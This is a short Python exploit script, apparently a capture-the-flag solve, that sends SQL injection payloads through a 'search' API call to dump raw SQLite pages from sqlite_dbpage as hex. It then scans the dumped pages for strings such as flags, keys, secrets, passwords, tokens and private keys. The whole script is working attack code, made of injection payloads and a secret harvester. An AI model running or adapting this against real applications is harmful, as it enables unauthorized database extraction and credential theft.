from client import GhostClient
import json

c = GhostClient()
c.bootstrap()

# Check how many pages exist in sqlite_dbpage
res = c.request("search", {"q": "' UNION SELECT 1, cast(count(*) as text), 'pages' FROM sqlite_dbpage--"})
print("Page count:", res)

# Dump page contents
res = c.request("search", {"q": "' UNION SELECT 1, cast(pgno as text), hex(data) FROM sqlite_dbpage--"})
if res.get("ok"):
    rows = [r for r in res["data"]["rows"] if r["id"] == 1]
    print(f"Retrieved {len(rows)} pages")
    full_hex = ""
    for r in rows:
        pg_num = r["title"]
        hex_data = r["summary"]
        print(f"Page {pg_num}: {len(hex_data)//2} bytes")
        # Search for strings in hex data
        raw_bytes = bytes.fromhex(hex_data)
        # Extract printable strings >= 4 chars
        import re
        strs = re.findall(b'[\x20-\x7e]{4,}', raw_bytes)
        print(f"  Strings in page {pg_num}:")
        for s in strs:
            s_str = s.decode('ascii', errors='ignore')
            if any(k in s_str.lower() for k in ["flag", "d3ctf", "key", "secret", "user", "pass", "admin", "token", "auth", "rs256", "private", "pem", "http", "test"]):
                print(f"    -> {s_str}")
else:
    print("Error dumping sqlite_dbpage:", res.get("error"))
